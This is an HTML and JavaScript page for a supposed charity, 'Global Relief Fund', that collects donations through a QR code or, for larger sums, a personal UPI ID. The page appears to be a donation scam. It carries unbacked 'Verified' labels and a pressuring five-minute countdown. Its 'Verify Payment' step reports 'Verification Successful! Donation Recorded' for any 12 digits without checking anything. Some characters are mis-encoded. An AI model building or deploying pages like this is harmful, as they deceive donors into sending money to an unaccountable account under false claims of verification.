<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>Global Relief Fund: Donate for Disaster & Medical Aid</title>
<style>
/* Basic Design */
:root{ --accent:#0376c6; --bg:linear-gradient(180deg,#f3f7fb 0%, #eef6fb 100%); }
*{box-sizing:border-box}
body{ margin:0; font-family:Inter,system-ui,Arial; background:var(--bg); color:#07203a; }
header{display:flex;align-items:center;justify-content:space-between;padding:12px 18px;background:#fff;box-shadow:0 2px 8px rgba(0,0,0,0.04);position:sticky;top:0;z-index:60}
.brand{font-weight:800;color:var(--accent)}
.btn{background:var(--accent);color:#fff;padding:10px 14px;border-radius:10px;text-decoration:none;font-weight:700;display:inline-block;border:none;cursor:pointer}
.container{max-width:980px;margin:18px auto;padding:0 14px}
.hero{display:flex;gap:18px;align-items:center;background:#0376c6; border-radius:12px;color:#fff;padding:30px}
.section{margin-top:50px}
.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:14px}
.card{background:#fff;border-radius:10px;overflow:hidden;box-shadow:0 6px 18px rgba(2,44,76,0.06);display:flex;flex-direction:column}
.card img{width:100%;height:150px;object-fit:cover}
.card .body{padding:12px}
.card .foot{padding:12px;border-top:1px solid #f1f5f9;display:flex;justify-content:space-between;align-items:center}
footer{margin-top:26px;padding:30px 0;text-align:center;color:#fff;background:#07203a}

/* Modal Styles */
.modal-backdrop{display:none;position:fixed;inset:0;background:rgba(2,20,40,0.45);z-index:200;align-items:center;justify-content:center;backdrop-filter:blur(3px)}
.modal{width:94%;max-width:450px;background:#fff;border-radius:12px;padding:20px;max-height:95vh;overflow-y:auto; text-align:center;}
.form-row{margin-top:10px;width:100%}
.form-row input{width:100%;padding:12px;border-radius:8px;border:1px solid #e6eef7;font-size:15px;outline:none;}
#qrImageDisplay { width: 220px; border-radius: 10px; border: 2px solid #eee; margin: 10px auto; display: block; }

/* Payment Specifics */
.timer-box { font-size: 14px; color: #d9534f; font-weight: bold; margin: 10px 0; background: #fff5f5; padding: 8px; border-radius: 5px; display: inline-block;}
.utr-input { width: 100%; padding: 12px; border: 2px solid #ccc; border-radius: 8px; margin-top: 15px; text-align: center; font-weight: bold; letter-spacing: 2px; font-size: 16px; transition: border-color 0.3s; }
.utr-input:focus { border-color: #0376c6; outline: none; }
.manual-upi-box { background: #fdf2ce; border: 1px solid #f0c14b; padding: 15px; border-radius: 8px; margin-top: 15px; }
.upi-text { font-family: monospace; font-size: 16px; background: #fff; padding: 8px; border: 1px dashed #333; display: block; margin: 10px auto; font-weight: bold; cursor: pointer; }

/* DISABLED BUTTON STYLE */
.btn-disabled {
    background: #cccccc !important;
    cursor: not-allowed !important;
    opacity: 0.7;
}
</style>
</head>
<body>

<header>
    <div class="brand">Global Relief Fund</div>
    <a class="btn" href="javascript:void(0)" onclick="openModal()">Donate Now</a>
</header>

<main class="container">
    <section class="hero">
        <div>
            <h1>Emergency Relief & Support</h1>
            <p>Verified MSME: UDYAM-JK-19-0015271</p>
        </div>
    </section>

    <section class="section">
        <h2>Our Causes</h2>
        <div class="grid">
            <div class="card"><img src="images/images.jpeg"><div class="body"><h3>Disaster Relief</h3></div><div class="foot"><a href="javascript:void(0)" onclick="openModal()" class="btn">Donate</a></div></div>
            <div class="card"><img src="images/images-1.jpg"><div class="body"><h3>Medical Aid</h3></div><div class="foot"><a href="javascript:void(0)" onclick="openModal()" class="btn">Donate</a></div></div>
            <div class="card"><img src="images/2Q==.jpg"><div class="body"><h3>Family Support</h3></div><div class="foot"><a href="javascript:void(0)" onclick="openModal()" class="btn">Donate</a></div></div>
        </div>
    </section>
</main>

<footer>
    <p>¬© 2025 Global Relief Fund</p>
</footer>

<div id="donateBackdrop" class="modal-backdrop">
  <div class="modal">
    
    <div id="step1">
        <h3 style="margin-top:0;">Donate to Save Lives</h3>
        <div class="form-row"><input id="dName" type="text" placeholder="Your Name"></div>
        <div class="form-row"><input id="dAmount" type="number" placeholder="Amount (e.g. 500)"></div>
        <button class="btn" style="width:100%; margin-top:15px;" onclick="checkAmountAndShow()">Next &rarr;</button>
    </div>

    <div id="step2" style="display:none;">
        
        <h2 style="color:#0376c6; margin:0 0 5px 0;">Global Relief Fund</h2>
        <p style="font-size:12px; color:gray; margin-top:0;">Verified Donation Portal</p>

        <div class="timer-box">Session Expires in: <span id="timeCount">05:00</span></div>

        <div id="smallAmountView" style="display:none;">
            <p style="color:#333; font-weight:bold; margin:10px 0;">Scan via GPay/PhonePe</p>
            
            <img src="images/pay.jpg" id="qrImageDisplay" alt="QR Not Found">
        </div>

        <div id="bigAmountView" style="display:none;">
            <p style="color:#d9534f; font-weight:bold;">Amount > ‚Çπ2000</p>
            <div class="manual-upi-box">
                <span style="font-size:13px;">‚ö†Ô∏è Use Manual UPI ID:</span>
                <span class="upi-text" onclick="copyUPI()">Q574755382@ybl</span>
                <button onclick="copyUPI()" style="background:#333; color:white; border:none; padding:4px 8px; border-radius:4px; font-size:11px; cursor:pointer;">Copy ID</button>
            </div>
        </div>

        <div style="margin-top:15px; border-top:1px solid #eee; padding-top:10px;">
            <p style="font-size:13px; color:#555; margin-bottom:5px; font-weight:bold;">Enter 12-Digit UTR to Verify:</p>
            
            <input type="text" id="utrNumber" class="utr-input" placeholder="XXXXXXXXXXXX" maxlength="12" oninput="validateUTR(this)">
            
            <button id="verifyBtn" class="btn btn-disabled" style="width:100%; margin-top:10px;" onclick="finish()" disabled>
                Verify Payment ‚úÖ
            </button>
        </div>

        <button onclick="resetModal()" style="background:none; border:none; color:red; margin-top:15px; cursor:pointer; font-size:12px;">Cancel Transaction</button>
    </div>
  </div>
</div>

<script>
    const MY_UPI_ID = "Q574755382@ybl";
    let timerInterval;

    function openModal() { 
        document.getElementById('donateBackdrop').style.display = 'flex'; 
        document.getElementById('step1').style.display = 'block';
        document.getElementById('step2').style.display = 'none';
    }
    
    function closeModal() { 
        document.getElementById('donateBackdrop').style.display = 'none'; 
        clearInterval(timerInterval);
    }

    function checkAmountAndShow() {
        var amt = document.getElementById('dAmount').value;
        if(amt < 1) { alert("Please enter amount"); return; }

        document.getElementById('step1').style.display = 'none';
        document.getElementById('step2').style.display = 'block';

        // Reset
        var utrInput = document.getElementById('utrNumber');
        utrInput.value = "";
        validateUTR(utrInput); 
        
        startTimer(300); // 5 Mins

        if(amt > 2000) {
            document.getElementById('smallAmountView').style.display = 'none';
            document.getElementById('bigAmountView').style.display = 'block';
        } else {
            document.getElementById('smallAmountView').style.display = 'block';
            document.getElementById('bigAmountView').style.display = 'none';
        }
    }

    // BUTTON ENABLE LOGIC
    function validateUTR(input) {
        // Only allow numbers
        input.value = input.value.replace(/[^0-9]/g, '');
        var val = input.value;
        var btn = document.getElementById('verifyBtn');

        if (val.length === 12) {
            // Enable
            btn.disabled = false;
            btn.classList.remove("btn-disabled"); 
            btn.style.background = "#28a745"; 
            input.style.borderColor = '#28a745';
        } else {
            // Disable
            btn.disabled = true;
            btn.classList.add("btn-disabled");
            btn.style.background = ""; 
            input.style.borderColor = '#d9534f';
        }
    }

    function startTimer(duration) {
        clearInterval(timerInterval);
        var timer = duration, minutes, seconds;
        var display = document.querySelector('#timeCount');
        
        timerInterval = setInterval(function () {
            minutes = parseInt(timer / 60, 10);
            seconds = parseInt(timer % 60, 10);
            minutes = minutes < 10 ? "0" + minutes : minutes;
            seconds = seconds < 10 ? "0" + seconds : seconds;
            display.textContent = minutes + ":" + seconds;

            if (--timer < 0) {
                clearInterval(timerInterval);
                alert("Session Expired");
                resetModal();
            }
        }, 1000);
    }

    function copyUPI() {
        navigator.clipboard.writeText(MY_UPI_ID);
        alert("UPI ID Copied!");
    }

    function resetModal() {
        clearInterval(timerInterval);
        document.getElementById('step1').style.display = 'block';
        document.getElementById('step2').style.display = 'none';
    }

    function finish() {
        alert("Verification Successful! Donation Recorded. Thank you. üôè");
        location.reload();
    }
</script>

</body>
                                  </html>
                
